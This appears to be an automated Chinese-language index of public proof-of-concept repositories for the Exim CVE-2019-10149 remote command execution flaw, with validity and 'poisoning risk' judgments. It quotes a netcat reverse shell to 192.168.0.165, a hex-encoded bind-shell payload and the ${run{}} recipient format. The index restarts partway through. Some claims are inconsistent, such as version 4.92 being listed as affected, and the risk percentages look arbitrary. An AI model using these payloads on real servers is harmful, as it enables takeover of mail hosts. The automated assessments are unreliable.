## 详情

CVE-2019-10149 漏洞存在于 Exim 邮件传输代理 (MTA) 的 `deliver_message()` 函数中，由于未正确验证收件人地址，攻击者可以通过构造特殊的电子邮件，在目标系统上执行任意命令。根据搜索结果，该漏洞已经被积极利用。提供的POC代码描述了如何利用该漏洞，包括安装易受攻击的Exim版本、配置、构造 payload 以及发送利用请求。

**有效性评估：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该POC代码是有效的。搜索结果表明该漏洞已被广泛利用，POC代码也提供了详细的利用步骤。POC代码中的安装步骤确保了在特定环境下漏洞的可复现性。

**投毒风险评估：**

初步分析POC代码仓库，`/tmp/a0abe20df178383d8f8296dfca6f85dc/RemoteConnection.sh` 脚本存在一定的投毒风险。该脚本使用 `tail -n 0 -f /tmp/1 | /bin/sh 2>&1 | nc -nv 192.168.0.165 444 1> /tmp/1` 建立反向连接，这意味着攻击者（或脚本控制者）可以通过 `nc` 连接到受害者机器，并在受害者机器上执行命令。虽然脚本中明确提示需要修改IP和端口，但如果用户不修改就直接运行，将会连接到脚本作者控制的服务器。这种行为虽然不是传统意义上的恶意代码注入，但具有潜在的远程控制风险。

除此之外, `RemoteConnection.sh` 使用 `/tmp/1` 作为管道文件进行输入输出重定向,这可能导致数据泄露或覆盖。

因此，综合评估，投毒风险约为10%。大部分代码是用于漏洞利用，但反向连接部分存在被恶意利用的可能，用户需要仔细审查并修改脚本。

**利用方式分析：**

1.  **安装漏洞版本 Exim:**  首先，需要安装一个存在漏洞的 Exim 版本 (4.87 - 4.91)。
2.  **配置 Exim:**  为了方便利用，需要修改 Exim 的配置，允许 relaying，避免等待时间限制，并取消 recipient 验证。
3.  **构造 Payload:**  将要执行的 shell 命令转换为十六进制字符串，并将其嵌入到收件人地址中。Payload 的格式为 `<${run{<hex_encoded_command>}}@localhost>`。
4.  **发送恶意邮件：**
    *   使用 `nc` 连接到 Exim 服务器的 25 端口。
    *   发送 `HELO` 命令。
    *   设置发件人地址为 `<>`。
    *   设置收件人地址为构造好的 payload。
    *   发送 `DATA` 命令，并发送 31 行任意内容、一个空行和一个句点 (`.`) 来结束邮件内容。
5.  **执行命令：** Exim 在处理邮件时，会执行嵌入在收件人地址中的 shell 命令。

**项目地址:** [darsigovrustam/CVE-2019-10149](https://github.com/darsigovrustam/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #14

**来源**: [CVE-2019-10149-hyim0810_CVE-2019-10149.md](../2019/CVE-2019-10149-hyim0810_CVE-2019-10149.md)

## CVE-2019-10149 - Exim deliver_message() Remote Command Execution

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行和系统完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行受影响版本的Exim，且攻击者能够通过网络连接到SMTP端口（通常是25端口）。配置不当，如允许任意relay，会降低利用难度。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149是Exim邮件传输代理（MTA）中的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对接收者地址的不正确验证。攻击者可以通过构造包含恶意命令的特殊邮件，利用该漏洞在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞信息、搜索结果和提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息和搜索结果都表明这是一个已知的、被广泛讨论和利用的漏洞。漏洞利用代码提供了详细的利用步骤，包括：

1.  安装受影响版本的Exim（4.87-4.91）。
2.  修改Exim配置以允许relay（简化利用，否则需要等待7天）。
3.  使用netcat (nc) 连接到目标Exim服务器的25端口。
4.  通过SMTP协议发送特制的邮件，其中接收者地址包含要执行的命令（hex编码）。
5.  发送DATA命令和后续数据，触发漏洞。

**投毒风险分析：**

提供的漏洞利用代码中存在一定的投毒风险，但风险较低（约10%）。

主要风险点在于`RemoteConnection.sh`脚本。该脚本的功能是建立一个反向shell，将目标服务器上的`/tmp/1`文件的内容通过`nc`命令发送到攻击者的IP地址和端口。潜在的投毒方式可能包括：

*   **替换`/tmp/1`的内容：** 攻击者可以将恶意代码写入`/tmp/1`文件，并通过反向shell在攻击者机器上执行。
*   **`RemoteConnection.sh`本身的恶意代码：** 脚本可能包含一些隐藏的后门或恶意操作，例如收集系统信息、安装rootkit等。但这个可能性较低，因为脚本相对简单且功能明确。
*   **依赖攻击者服务器的风险：** 脚本依赖于从攻击者的服务器下载`RemoteConnection.sh`，如果攻击者控制的服务器被攻陷，或者攻击者修改了`RemoteConnection.sh`脚本的内容，可能会导致受害者执行恶意代码。

漏洞利用仓库中安装的Exim版本以及对`/usr/exim/configure`文件的修改，是为了简化利用流程，使其更容易被利用。这些修改本身不是投毒代码，但降低了利用门槛，可能导致漏洞被更广泛地利用。

**利用方式总结：**

1.  **目标环境准备：** 确保目标服务器运行着受影响版本的Exim（4.87-4.91）。
2.  **网络连接：** 攻击者需要能够通过网络连接到目标服务器的25端口。
3.  **Payload构造：** 攻击者需要将要执行的命令转换为十六进制编码，并将其嵌入到SMTP `RCPT TO` 命令的接收者地址中，格式为 `<${run{hex_encoded_command}}@localhost>`。
4.  **SMTP交互：** 攻击者使用SMTP协议与目标服务器进行交互，发送`HELO`、`MAIL FROM`、`RCPT TO` 和 `DATA` 等命令，触发漏洞。
5.  **代码执行：** 漏洞触发后，Exim会执行嵌入在接收者地址中的命令，攻击者从而获得对目标服务器的控制权。

**项目地址:** [hyim0810/CVE-2019-10149](https://github.com/hyim0810/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #15

**来源**: [CVE-2019-10149-qlusec_CVE-2019-10149.md](../2019/CVE-2019-10149-qlusec_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可远程执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive), 4.92受影响

**利用条件:** 目标系统运行存在漏洞的Exim版本，且允许接收邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当，导致攻击者可以通过构造特殊的邮件，在目标服务器上执行任意命令。

**有效性：**

提供的POC代码是有效的，它展示了如何利用此漏洞执行命令。POC中的 `payload.txt` 文件构造了一个包含嵌入命令的收件人地址。`rcpt to:` 字段包含一个`${run{...}}` 块，Exim 会执行该块中的命令。

**投毒风险：**

此仓库存在一定的投毒风险。虽然 `payload.txt` 文件展示了漏洞利用方法，但 `README.md` 文件内容过于简单，缺乏漏洞的详细说明和利用注意事项。此外，POC代码中包含反弹shell的操作，可能被用于恶意目的，如果攻击者替换了原有的反弹shell代码，风险较高。
综合评估投毒风险为10%。

**利用方式：**

1.  攻击者发送一封精心构造的邮件到目标 Exim 服务器。
2.  邮件的 `RCPT TO` 字段包含一个特殊的字符串，其中嵌入了要执行的命令。`${run{...}}`是一个常见的Exim宏扩展结构。
3.  当 Exim 处理该邮件时，由于漏洞的存在，它会执行嵌入在 `RCPT TO` 字段中的命令，该命令将执行反弹shell或其它恶意操作。
4.  命令执行结果被通过 `nc` 命令发送到攻击者的服务器。

**项目地址:** [qlusec/CVE-2019-10149](https://github.com/qlusec/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #16

**来源**: [CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md](../2019/CVE-2019-10149-rahmadsandy_EXIM-4.87-CVE-2019-10149.md)

# CVE-2019-10149

> 📦 该CVE有 **17** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md](../2019/CVE-2019-10149-AzizMea_CVE-2019-10149-privilege-escalation.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标服务器运行Exim邮件服务器，且版本在4.87到4.91之间，需要网络访问25端口。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理 (MTA) 的 deliver_message() 函数中，由于对接收者地址验证不当导致。攻击者可以通过发送特制的电子邮件，在目标服务器上执行任意命令。

**有效性分析：**

根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的利用是有效的。POC代码 `wizard.py` 模拟了SMTP交互，利用`RCPT TO`命令中的`${run{...}}` 扩展功能，执行shell命令。

**投毒风险分析：**

检查提供的`wizard.py`文件，其中的payload经过了编码，目的是为了绕过一些检测机制。解码后的命令主要完成以下操作：

*   创建一个具有SUID权限的程序 `s`。
*   该程序 `s` 拥有root权限，执行后会启动一个root shell。
*   利用`${run{}}` 在服务器上执行编译命令，生成二进制文件s，并赋予SUID权限
*   POC的最后，执行该程序 `/tmp/s` 以获取root权限。

该POC旨在提升权限，而不是注入恶意代码到服务器的持久性位置，因此不属于传统的“投毒”行为。 投毒风险：0%

**利用方式：**

1.  攻击者连接到Exim服务器的25端口。
2.  发送HELO, MAIL FROM等SMTP命令进行初始化。
3.  利用 `RCPT TO` 命令，构造包含恶意命令的接收者地址，其中使用了 `${run{...}}` 扩展功能。
4.  发送DATA命令，提供邮件内容 (实际上邮件内容对利用该漏洞来说并不重要)。
5.  利用服务器执行`${run{}}`中的命令，该命令编译一个具有SUID的程序，攻击者执行该程序以获取root权限。

**项目地址:** [AzizMea/CVE-2019-10149-privilege-escalation](https://github.com/AzizMea/CVE-2019-10149-privilege-escalation)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #2

**来源**: [CVE-2019-10149-Brets0150_StickyExim.md](../2019/CVE-2019-10149-Brets0150_StickyExim.md)

## CVE-2019-10149 Exim RCE HoneyPot

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务运行且存在漏洞版本

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 4.87 到 4.91 版本中存在的一个远程代码执行漏洞。该漏洞源于 `deliver_message()` 函数中对接收者地址的不当验证，攻击者可以通过构造包含恶意命令的电子邮件，利用此漏洞在目标系统上执行任意代码。

**有效性评估：**

根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、被广泛讨论的严重漏洞，并且已经被实际利用。提供的漏洞利用代码实际上是一个蜜罐脚本，用于检测针对此漏洞的攻击尝试，而不是一个直接利用漏洞的 PoC。然而，README中提到了另一个PoC：`https://github.com/cowbe0x004/eximrce-CVE-2019-10149`， 可以验证漏洞。

**投毒风险评估：**

该仓库主要功能是做一个蜜罐，用于监控Exim漏洞(CVE-2019-10149)的攻击行为。

*   `install_StickyExim.sh`: 安装和配置蜜罐，包括Exim配置和Cron Job设置
*   `honey_harvester_exim_cve-2019-10149.sh`: 核心脚本，用于解析Exim日志，检测CVE-2019-10149攻击尝试，并发送告警邮件。

审查了安装脚本和核心检测脚本。发现主要功能是监控和告警，没有发现明显的恶意代码，考虑到代码会修改Exim配置以及加入Cron Job。存在一定的风险，但是风险较低。所以判断存在10%的投毒风险。

**利用方式分析：**

此PoC本身不是用于攻击的，而是用于创建一个蜜罐来捕获攻击流量。 但是根据漏洞描述，利用方式大致如下：

1.  攻击者构造一封特殊的电子邮件，该邮件的接收者地址包含恶意命令。
2.  当 Exim 处理这封邮件时，`deliver_message()` 函数未能正确验证接收者地址，导致恶意命令被执行。
3.  攻击者可以通过这种方式在服务器上执行任意代码，从而控制服务器。

**总结：**

该漏洞是一个严重的安全漏洞，可以允许未经身份验证的远程攻击者在受影响的 Exim 服务器上执行任意代码。需要尽快修补此漏洞。

**项目地址:** [Brets0150/StickyExim](https://github.com/Brets0150/StickyExim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #3

**来源**: [CVE-2019-10149-Chris-dev1_exim.exp.md](../2019/CVE-2019-10149-Chris-dev1_exim.exp.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致完全控制受影响的服务器

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响的Exim版本，并且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中。这是一个远程命令执行漏洞，由于 `deliver_message()` 函数中对接收者地址的验证不当，导致攻击者可以通过发送特制的电子邮件来执行任意命令。漏洞利用方式通常涉及构造包含恶意命令的电子邮件地址，这些命令会在 Exim 处理邮件时被执行。从搜索结果和漏洞库信息来看，此漏洞已被广泛利用。提供的代码片段仅为Apache License 2.0协议，不包含任何漏洞利用或恶意代码。因此，可以判断投毒风险为0%。根据搜索结果，漏洞利用代码已经公开。

**项目地址:** [Chris-dev1/exim.exp](https://github.com/Chris-dev1/exim.exp)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #4

**来源**: [CVE-2019-10149-Diefunction_CVE-2019-10149.md](../2019/CVE-2019-10149-Diefunction_CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标服务器运行存在漏洞的Exim版本，且允许外部连接到SMTP端口（默认25端口）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。漏洞原因是Exim在`deliver_message()`函数中对收件人地址的验证不当，攻击者可以通过构造特殊的邮件收件人地址，在服务器上执行任意命令。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞是真实存在的，且有可用的POC代码。搜索引擎结果中多个链接（例如Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire, RedHat）都确认了此漏洞的存在和高危性。CISA已将此漏洞加入已知被利用的漏洞目录(KEV)。提供的PoC脚本也证实了利用方法的可行性。

**投毒风险：**
分析提供的`exploit.py`代码，该脚本主要功能是利用SMTP协议与目标Exim服务器进行交互，构造包含恶意命令的收件人地址，从而实现远程命令执行。脚本的主要步骤包括：
1.  建立socket连接到目标服务器的25端口
2.  发送EHLO命令
3.  发送MAIL FROM命令
4.  发送RCPT TO命令，其中收件人地址包含`${run{...}}`结构，用于执行命令
5.  发送DATA命令
6.  发送包含一系列Received头的邮件正文，最后以".\r\n"结束

检查脚本代码，没有发现任何可疑的、与漏洞利用无关的代码。payload部分通过字符串格式化，将反弹shell命令注入到收件人地址中。因此，可以认为此仓库中作者隐藏投毒代码的可能性为0%。

**利用方式：**
1.  **前期准备：** 攻击者需要一台可以访问目标服务器的机器，并且需要知道目标服务器的IP地址和SMTP端口（通常是25）。攻击者还需要监听一个端口，用于接收目标服务器反弹的shell。
2.  **漏洞利用：** 攻击者运行提供的`exploit.py`脚本，指定目标服务器的IP地址、SMTP端口、攻击者自己的IP地址和监听端口。
3.  **远程命令执行：** 脚本会构造一个包含恶意命令的邮件，发送给目标服务器。当Exim处理该邮件时，会执行恶意命令，通常是反弹shell。
4.  **获取shell：** 攻击者在自己的机器上接收到反弹的shell，从而控制目标服务器。

**项目地址:** [Diefunction/CVE-2019-10149](https://github.com/Diefunction/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #5

**来源**: [CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md](../2019/CVE-2019-10149-Dilshan-Eranda_CVE-2019-10149.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可导致远程代码执行，完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标Exim服务器监听25端口，并且存在漏洞版本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 存在于Exim的 deliver_message() 函数中，由于对接收者地址验证不当，可能导致远程命令执行。攻击者可以通过构造特殊的邮件，在接收者地址中注入恶意命令，从而在目标服务器上执行任意代码。

**有效性评估：**
根据漏洞库信息和搜索结果，CVE-2019-10149 是一个已被确认的、高危的远程命令执行漏洞。多个安全厂商和研究人员已经发布了相关的分析和PoC代码。

**投毒风险评估：**
提供的PoC代码只有一个README.md文件，内容是关于漏洞的SNP分配，本身不包含任何可执行的代码，因此直接投毒的概率较低。但是，PoC代码仓库可能包含其他未列出的恶意文件或依赖项，所以仍然存在一定的投毒风险。根据目前的信息，投毒风险估计为10%。更完善的分析需要检查所有文件和依赖。

**利用方式：**
1.  攻击者向目标 Exim 服务器发送一封特制的电子邮件。
2.  该邮件的接收者地址中包含恶意构造的命令注入代码。
3.  当 Exim 处理该邮件时，由于 deliver_message() 函数的验证缺陷，恶意命令会被执行。
4.  攻击者从而获得目标服务器的远程代码执行权限，可以执行任意操作，如安装后门、窃取数据等。

**排序优先级说明：** 遵循 搜索引擎结果 > 漏洞利用代码 > 漏洞库信息 原则。


**项目地址:** [Dilshan-Eranda/CVE-2019-10149](https://github.com/Dilshan-Eranda/CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #6

**来源**: [CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md](../2019/CVE-2019-10149-MNEMO-CERT_PoC--CVE-2019-10149_Exim.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制受影响的服务器

**影响版本:** 4.87 - 4.91

**利用条件:** 需要 Exim 服务在目标机器上运行，且版本在受影响范围内，可能需要目标服务器开放25端口。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-10149 是 Exim 邮件服务器中存在的远程命令执行漏洞。该漏洞是由于 `deliver_message()` 函数中对收件人地址的不正确验证引起的。攻击者可以通过发送特制的电子邮件利用此漏洞，从而在服务器上以 root 权限执行任意命令。

**有效性评估：**

提供的 PoC 代码 `PoC_CVE-2019-10149.py` 看起来有效。它通过 SMTP 协议与 Exim 服务器建立连接，并发送包含恶意命令的电子邮件。该命令嵌入在收件人地址中，利用了 Exim 的字符串扩展功能来执行命令。

多个来源（Tenable, NVD, Rapid7, Microsoft, Trend Micro, Qualys, Orpheus Cyber, SecPod, esentire）确认了该漏洞的存在和严重性，并指出该漏洞已被积极利用。

**投毒风险评估：**

该 PoC 代码本身相对简单，主要功能是利用漏洞执行命令。投毒的潜在风险较低，但并非完全没有。

*   **编码风险：** 代码中包含hex编码，降低了代码可读性，可能存在隐藏代码，如果hex编码混淆了正常的指令与后门代码，存在一定的风险。
*   **依赖风险：** 该脚本依赖Python3和socket，确保环境安全。
*   **维护者风险：**虽然README.md声明免责声明，但依旧存在风险，需要保持警惕。

综合考虑，该仓库的投毒风险评估在10%。

**利用方式分析：**

1.  **目标确认：** 确认目标系统运行着受影响版本的 Exim（4.87 到 4.91）。
2.  **SMTP 连接：** 使用 PoC 脚本通过 SMTP 协议连接到目标 Exim 服务器的 25 端口（或其他配置的端口）。
3.  **构造恶意邮件：** PoC 脚本构造一封包含恶意收件人地址的电子邮件。该地址利用 Exim 的字符串扩展功能来执行命令。
4.  **发送邮件：** 将构造的邮件发送到目标 Exim 服务器。
5.  **命令执行：** 如果漏洞利用成功，Exim 将以 root 权限执行嵌入在收件人地址中的命令。

**缓解措施：**

*   升级 Exim 到受影响版本之外的版本(>=4.92)。
*   禁用 Exim 的字符串扩展功能（如果可能）。
*   使用防火墙限制对 Exim 端口的访问。

**项目地址:** [MNEMO-CERT/PoC--CVE-2019-10149_Exim](https://github.com/MNEMO-CERT/PoC--CVE-2019-10149_Exim)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #7

**来源**: [CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md](../2019/CVE-2019-10149-Stick-U235_CVE-2019-10149-Exploit.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** 4.87-4.91

**利用条件:** 目标系统运行受影响版本的Exim，且允许从攻击者主机到目标机器25端口的TCP连接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-10149是Exim 4.87到4.91版本中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以利用此漏洞，通过构造包含恶意命令的特殊邮件，在目标系统上执行任意代码，从而完全控制系统。

**有效性分析：**
根据漏洞库信息、搜索引擎结果以及提供的PoC代码，可以确认此漏洞是真实存在的，并且PoC代码可以有效利用此漏洞。

**投毒风险分析：**
PoC代码通过`nc`在目标机器上反弹shell，监听31415端口。代码本身目的是利用漏洞，没有发现隐藏的恶意代码或后门，因此投毒风险较低，为0%。

**漏洞利用方式：**
1.  PoC首先通过`nc`连接到目标Exim服务器的25端口（SMTP）。
2.  发送`HELO`命令，声明客户端主机名。
3.  发送`MAIL FROM`命令，指定发件人地址。
4.  发送`RCPT TO`命令，指定收件人地址，其中收件人地址包含恶意的payload：`${run{\x2fbin\x2fsh\t-c\t\x22nc\t-lp\t31415\t-e\t\x2fbin\x2fsh\x22}}@localhost`。
    *   这个payload使用了Exim的`${run{}}`扩展函数，可以在Exim进程中执行任意命令。
    *   payload的功能是执行`nc -lp 31415 -e /bin/sh`，即在目标机器上监听31415端口，并将/bin/sh绑定到该端口，相当于反弹了一个shell。
5.  发送`DATA`命令，开始邮件内容传输。
6.  发送一系列`Received:`头，用于填充邮件内容并触发漏洞（原因在于Exim对过长的头部处理可能存在问题，也可能是为了绕过某些过滤）。
7.  发送`.
`表示邮件内容结束。
8.  发送`QUIT`命令断开连接。
9.  PoC最后使用`nc localhost 31415`连接到目标机器上反弹的shell，实现远程代码执行。

**项目地址:** [Stick-U235/CVE-2019-10149-Exploit](https://github.com/Stick-U235/CVE-2019-10149-Exploit)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #8

**来源**: [CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md](../2019/CVE-2019-10149-VoyagerOnne_Exim-CVE-2019-10149.md)

## CVE-2019-10149-Exim-远程命令执行

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程命令执行

**影响应用:** Exim

**危害等级:** 高危，可完全控制服务器

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要Exim服务对外开放SMTP端口(默认25)

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149是Exim邮件服务器中存在的一个远程命令执行漏洞。该漏洞源于`deliver_message()`函数中对收件人地址的不当验证。攻击者可以通过构造包含恶意代码的特殊收件人地址，利用`run{}`扩展函数执行任意命令。该漏洞的利用方式主要通过SMTP协议发送特制的邮件，在`RCPT TO`指令中注入恶意payload。PoC代码构造了包含payload的收件人地址，利用`${run{}}`语法执行命令。考虑到PoC作者公开了他的代码，并且投毒代码的收益比直接攻击低，因此投毒概率较低，但是仍存在一定风险。

**项目地址:** [VoyagerOnne/Exim-CVE-2019-10149](https://github.com/VoyagerOnne/Exim-CVE-2019-10149)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #9

**来源**: [CVE-2019-10149-aishee_CVE-2019-10149-quick.md](../2019/CVE-2019-10149-aishee_CVE-2019-10149-quick.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 需要目标系统运行存在漏洞版本的 Exim，且攻击者能够发送邮件到目标服务器。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2019-10149 存在于 Exim 邮件服务器的 `deliver_message()` 函数中，由于对收件人地址验证不当导致远程命令执行。攻击者可以通过构造特殊的邮件，在收件人地址中注入恶意命令，当 Exim 处理该邮件时，这些命令会被执行，从而控制服务器。

**有效性:**
根据搜索引擎结果，该漏洞已被广泛证实存在，并且有公开的 PoC 利用代码。漏洞库信息也确认了该漏洞的存在。

**投毒风险:**
提供的 PoC 代码包含一个 Bash 脚本，用于检测目标操作系统并尝试更新 Exim 和 Curl 软件包。这个脚本本身看起来像是尝试修复漏洞，而非利用它。`README.md` 文件也描述脚本为快速修复程序。虽然脚本尝试更新软件包，但如果服务器配置不当，或者更新源被恶意篡改，也存在一定的风险。此外，`apt-get --yes --force-yes install`和 `yum install -y -q -e 0` 在没有充分验证更新源的情况下，可能安装恶意的软件包。因此，存在极小的潜在投毒风险，约为 1%。

**利用方式:**
1.  攻击者需要确定目标服务器运行的是 Exim 4.87 到 4.91 之间的易受攻击版本。
2.  攻击者构造一封包含恶意命令的电子邮件。该命令被嵌入到收件人地址中，利用了 `deliver_message()` 函数的漏洞。
3.  攻击者将构造的邮件发送到目标服务器。
4.  当 Exim 处理该邮件时，会执行嵌入在收件人地址中的恶意命令，从而导致远程代码执行。攻击者可以使用此漏洞来安装后门、窃取敏感信息或执行其他恶意操作。

**项目地址:** [aishee/CVE-2019-10149-quick](https://github.com/aishee/CVE-2019-10149-quick)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #10

**来源**: [CVE-2019-10149-bananaphones_exim-rce-quickfix.md](../2019/CVE-2019-10149-bananaphones_exim-rce-quickfix.md)

## CVE-2019-10149-Exim-RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行

**影响应用:** Exim

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 4.87 to 4.91

**利用条件:** 目标系统运行受影响版本的Exim，且漏洞未被修复

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2019-10149 存在于 Exim 4.87 到 4.91 版本中，是由于 `deliver_message()` 函数中对接收者地址验证不当造成的远程命令执行漏洞。攻击者可以通过构造特殊的邮件，利用该漏洞在目标服务器上执行任意命令。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，该漏洞的POC代码是有效的。搜索引擎结果显示该漏洞已被广泛利用，并且有活跃的Linux蠕虫利用此漏洞传播。漏洞利用代码中的 `exim_rce_fixer.sh` 脚本尝试更新 Exim 并移除恶意软件，表明存在利用该漏洞植入的恶意程序。

**投毒风险分析：**
提供的脚本 `exim_rce_fixer.sh` 旨在修复漏洞并清理恶意软件，但它本身可能存在投毒风险。脚本尝试删除与 `tor2web` 相关的恶意软件，更新 Exim，并删除可疑的 cron 任务和 authorized_keys 条目。但是，如果脚本未能完全清除恶意软件，或者脚本本身包含恶意代码，则可能导致系统受损。此外，脚本强制重启服务器，这可能导致数据丢失或服务中断。

`malware_do_not_run.sh` 脚本明确包含连接到 Tor 网络的行为，并尝试下载和执行恶意代码。尽管文件名暗示不要运行，但攻击者可以通过该脚本植入恶意软件。

综合考虑，脚本中清理恶意软件的部分看起来是合法的，但 `malware_do_not_run.sh` 脚本和`exim_rce_fixer.sh`脚本潜在的清理不完全和强制重启行为构成了投毒风险。

**利用方式：**
1.  攻击者构造包含恶意命令的特殊邮件。
2.  Exim 在处理邮件时，由于对接收者地址验证不当，将恶意命令传递给系统 shell 执行。
3.  攻击者从而在目标服务器上获得远程代码执行权限。
4.  攻击者可能利用该权限安装恶意软件，窃取数据，或控制服务器。

**项目地址:** [bananaphones/exim-rce-quickfix](https://github.com/bananaphones/exim-rce-quickfix)

**漏洞详情:** [CVE-2019-10149](https://nvd.nist.gov/vuln/detail/CVE-2019-10149)

---

## POC #11

**来源**: [CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md](../2019/CVE-2019-10149-cloudflare_exim-cve-2019-10149-data.md)

## CVE-2019-10149 Exim RCE

**漏洞编号:** CVE-2019-10149

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Exim

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意命令

**影响版本:** 4.87 to 4.91 (inclusive)

**利用条件:** 目标系统运行存在漏洞的Exim版本，并且攻击者可以向Exim服务器发送邮件。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2019-10149 存在于 Exim 邮件传输代理（MTA）的 deliver_message() 函数中，由于对收件人地址的验证不当导致。未经身份验证的远程攻击者可以通过向目标服务器发送特制的邮件来利用此漏洞，从而在目标系统上执行任意命令。漏洞利用通常涉及在邮件收件人地址中注入 shell 命令。 

根据提供的漏洞利用代码，`/tmp/b373ced1c77bc05f74b9541e06f0010c/README.md`文件主要包含关于CVE-2019-10149、CVE-2019-15846 和 CVE-2019-16928漏洞的相关信息收集，包括漏洞公告、漏洞利用详情、问题时间线、NSA公告以及受影响的IP、ASN、国家和主机名等数据链接。其中`election-domains-by-expiration-date.txt`文件是域名列表, 不太可能直接用于漏洞利用，但是可能被用于信息收集或后续攻击。

